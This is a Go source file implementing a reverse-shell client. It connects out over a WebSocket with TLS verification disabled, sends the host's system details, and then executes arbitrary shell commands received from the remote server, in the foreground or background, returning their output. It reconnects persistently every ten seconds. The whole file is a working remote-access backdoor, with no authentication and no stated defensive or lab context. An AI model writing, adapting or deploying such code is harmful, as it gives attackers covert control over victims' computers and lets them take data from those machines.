package main
import (
	"fmt"
	"github.com/gorilla/websocket"
	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/host"
	"strings"
	"crypto/tls"
	"time"
	"os"
	"os/exec"
)

const (
	HOST string = "127.0.0.1"
	PORT int = 8765
)

type ExecuteCommand struct {
	conn *websocket.Conn
}

func (e *ExecuteCommand) execute_command(command string) map[string]interface{} {
	host_info, _ := host.Info()
	var shell, flag string
	if host_info.OS == "windows" {
		shell, flag = "cmd", "/C"
	} else {
		shell, flag = "sh", "-c"
	}

	cmd := exec.Command(shell, flag, command)
	output, err := cmd.CombinedOutput()
	output_str := string(output)
	if len(output_str) > 600000 {
		output_str = output_str[:600000]
	}

	result_map := make(map[string]interface{})
	result_map["command"] = command
	result_map["output"] = output_str
	if err != nil {
		result_map["error"] = err.Error()
	}
	result_map["status"] = cmd.ProcessState.ExitCode()
	return result_map
}

func (e *ExecuteCommand) execute_bg_command(command string) {
	host_info, _ := host.Info()
	var shell, flag string
	if host_info.OS == "windows" {
		shell, flag = "cmd", "/C"
	} else {
		shell, flag = "sh", "-c"
	}

	cmd := exec.Command(shell, flag, command)
	_ = cmd.Start()
}

func (e *ExecuteCommand) change_directory(directory string) string {
	err := os.Chdir(directory)
	if err != nil {
		return err.Error()
	}
	return "Directory changed successfully"
}

func get_system_info() string {
	hostInfo, _ := host.Info()
	cpuInfo, _ := cpu.Info()
	system := hostInfo.OS
	node := hostInfo.Hostname
	release := hostInfo.PlatformVersion
	version := hostInfo.KernelVersion
	machine := hostInfo.KernelArch
	processor := cpuInfo[0].ModelName
	systemInfo := fmt.Sprintf("%s %s %s %s %s %s",
		system, node, release, version, machine, processor)

	return systemInfo
}

func client_loop() {
	tls_config := &tls.Config{
		InsecureSkipVerify: true,
	}
	dialer := websocket.Dialer{
		TLSClientConfig: tls_config,
	}
	for {
		conn, _, err := dialer.Dial(
			fmt.Sprintf("wss://%s:%d", HOST, PORT),
			nil,
		)
		if err != nil {
			time.Sleep(10 * time.Second)
			continue
		}
		system_info := get_system_info()
		_ = conn.WriteMessage(websocket.TextMessage, []byte(system_info))
		Executecommand := &ExecuteCommand{conn: conn}
		for {
			_, message, _ := conn.ReadMessage()
			command := string(message)
			fmt.Println(command)
			if command ==  "exit"{
				conn.Close()
				return
			} else if strings.HasPrefix(command, "command:"){
				command = command[len("command:"):]
				output := Executecommand.execute_command(command)
				_ = conn.WriteJSON(output)
			} else if strings.HasPrefix(command, "background:"){
			    command = command[len("background:"):]
				go Executecommand.execute_bg_command(command)
				_ = conn.WriteMessage(websocket.TextMessage, []byte("Command has been sent and executed."))
			} else if strings.HasPrefix(command, "change_directory:") {
				directory := command[len("change_directory:"):]
				result := Executecommand.change_directory(directory)
				_ = conn.WriteMessage(websocket.TextMessage, []byte(result))
			}
		}
	}
}

func main() {
	client_loop()
}